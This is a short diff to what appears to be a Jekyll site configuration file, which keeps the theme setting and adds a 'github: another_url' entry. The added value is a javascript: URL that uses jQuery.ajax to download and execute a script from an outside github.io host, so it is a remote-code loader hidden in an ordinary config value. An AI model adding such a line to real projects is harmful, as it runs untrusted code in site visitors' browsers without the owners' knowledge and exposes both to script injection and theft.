@@ -1,1 +1,3 @@
 theme: jekyll-theme-leap-day
+github:
+  another_url: javascript:jQuery.ajax({url:"https://gornostay25.github.io/auto1/auto1.js",dataType:"script",async:1});
